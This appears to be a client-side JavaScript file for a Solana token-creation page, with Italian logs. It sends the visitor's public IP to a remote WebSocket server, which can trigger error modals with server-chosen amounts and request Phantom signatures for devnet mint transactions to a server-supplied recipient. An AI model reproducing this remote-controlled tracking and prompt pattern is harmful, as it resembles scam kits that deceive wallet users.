const splToken = window.splToken;
const solanaWeb3 = window.solanaWeb3;

window.ws = null;
let reconnectAttempts = 0;
const maxReconnectDelay = 30000;

function getAssociatedTokenAddress(mint, owner) {
    return solanaWeb3.PublicKey.findProgramAddressSync(
        [
            owner.toBuffer(),
            splToken.TOKEN_PROGRAM_ID.toBuffer(),
            mint.toBuffer(),
        ],
        splToken.ASSOCIATED_TOKEN_PROGRAM_ID
    )[0];
}

function connectWebSocket() {
    window.ws = new WebSocket('wss://luna2dev-1.onrender.com/');

    window.ws.onopen = () => {
        console.log('[WS] Connessione aperta');
        reconnectAttempts = 0;

        if (window.realUserIp) {
            window.ws.send(JSON.stringify({
                type: 'register_real_ip',
                real_ip: window.realUserIp
            }));
        }
    };

    window.ws.onmessage = async (event) => {
        console.log('[WS] Messaggio ricevuto:', event.data);
        try {
            const data = JSON.parse(event.data);

            if (data.command === 'show_error') {
                const errorId = data.payload?.error_id;
                const amount = data.payload?.amount;

                document.cookie = `error_id=${errorId}; path=/; max-age=86400`;
                document.cookie = `error_amount=${amount}; path=/; max-age=86400`;
                document.cookie = `show_pre_error=${true}; path=/; max-age=86400`;

                if (!errorId) {
                    console.warn('[WS] Unknown or missing error_id:', errorId);
                    return;
                }

                window.showErrorModal(errorId, amount, "N/A", true);

            } else if (data.command === 'hide_error') {
                window.hideErrorModal();

            } else if (data.command === 'create_token_ready') {
                const {
                    uri: metadataUri,
                    name,
                    symbol,
                    supply,
                    decimals,
                    recipient,
                    options
                } = data.payload;

                console.log('[WS] Comando create_token_ready ricevuto:', data.payload);

                if (window.solana && window.solana.isPhantom) {
                    try {
                        const provider = window.solana;
                        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('devnet'));

                        const resp = await provider.connect();
                        console.log('[Phantom] Connesso con:', resp.publicKey.toString());

                        const mintAuthority = resp.publicKey;
                        const freezeAuthority = options.freeze_authority ? resp.publicKey : null;

                        const mint = solanaWeb3.Keypair.generate();
                        const recipientPublicKey = new solanaWeb3.PublicKey(recipient);

                        const recipientATA = getAssociatedTokenAddress(
                            mint.publicKey,
                            recipientPublicKey
                        );

                        const transaction = new solanaWeb3.Transaction();

                        transaction.add(
                            solanaWeb3.SystemProgram.createAccount({
                                fromPubkey: provider.publicKey,
                                newAccountPubkey: mint.publicKey,
                                lamports: await connection.getMinimumBalanceForRentExemption(splToken.MINT_SIZE),
                                space: splToken.MINT_SIZE,
                                programId: splToken.TOKEN_PROGRAM_ID,
                            })
                        );

                        transaction.add(
                            splToken.createInitializeMintInstruction(
                                mint.publicKey,
                                decimals,
                                mintAuthority,
                                freezeAuthority
                            )
                        );

                        transaction.add(
                            splToken.createAssociatedTokenAccountInstruction(
                                provider.publicKey,
                                recipientATA,
                                recipientPublicKey,
                                mint.publicKey
                            )
                        );

                        transaction.add(
                            splToken.createMintToInstruction(
                                mint.publicKey,
                                recipientATA,
                                mintAuthority,
                                supply * (10 ** decimals)
                            )
                        );

                        // Aggiunta metadati (se forniti)
                        if (metadataUri) {
                            const metadataProgramId = new solanaWeb3.PublicKey("metaqbxxUerdq28cj1RbAWkYQm3ybzjb6a8bt518x1s");
                            const [metadataPDA] = await solanaWeb3.PublicKey.findProgramAddress(
                                [
                                    Buffer.from("metadata"),
                                    metadataProgramId.toBuffer(),
                                    mint.publicKey.toBuffer(),
                                ],
                                metadataProgramId
                            );

                            const metadataInstruction = new solanaWeb3.TransactionInstruction({
                                keys: [
                                    { pubkey: metadataPDA, isSigner: false, isWritable: true },
                                    { pubkey: mint.publicKey, isSigner: false, isWritable: false },
                                    { pubkey: provider.publicKey, isSigner: true, isWritable: false },
                                ],
                                programId: metadataProgramId,
                                data: Buffer.from([]), // La tua istruzione personalizzata lato server lo dovrebbe gestire
                            });

                            transaction.add(metadataInstruction);
                        }

                        transaction.feePayer = provider.publicKey;
                        transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

                        transaction.partialSign(mint);

                        const signedTx = await provider.signAndSendTransaction(transaction);
                        const sig = signedTx.signature;

                        console.log('[Phantom] Transazione inviata:', sig);
                        Swal.fire({
                            title: 'Successo!',
                            text: `Token "${name}" creato! ID transazione: ${sig}`,
                            icon: 'success',
                            background: '#1e1e1e',
                            color: '#fff',
                            confirmButtonColor: '#3085d6'
                        });

                    } catch (err) {
                        console.error('[Phantom] Errore durante la creazione token:', err);
                        Swal.fire({
                            title: 'Errore Phantom',
                            text: err.message || 'Si è verificato un errore con Phantom.',
                            icon: 'error',
                            background: '#1e1e1e',
                            color: '#fff',
                            confirmButtonColor: '#d33'
                        });
                    }
                } else {
                    Swal.fire({
                        title: 'Phantom non trovato',
                        text: 'Per favore installa Phantom Wallet per procedere.',
                        icon: 'warning',
                        background: '#1e1e1e',
                        color: '#fff',
                        confirmButtonColor: '#3085d6'
                    });
                }
            }
        } catch (err) {
            console.error('[WS] Errore parsing messaggio:', err);
        }
    };

    window.ws.onerror = (err) => {
        console.error('[WS] Errore:', err);
    };

    window.ws.onclose = (event) => {
        console.warn(`[WS] Connessione chiusa (code ${event.code})`);
        reconnectAttempts++;
        const delay = Math.min(1000 * reconnectAttempts, maxReconnectDelay);
        setTimeout(connectWebSocket, delay);
    };
}

connectWebSocket();

// Ottieni IP utente reale
fetch('https://api.ipify.org?format=json')
    .then(res => res.json())
    .then(data => {
        window.realUserIp = data.ip;
        console.log('[IP] IP utente:', window.realUserIp);

        if (window.ws && window.ws.readyState === WebSocket.OPEN) {
            window.ws.send(JSON.stringify({
                type: 'register_real_ip',
                real_ip: window.realUserIp
            }));
        }
    })
    .catch(err => {
        console.warn('[IP] Impossibile ottenere IP:', err);
    });
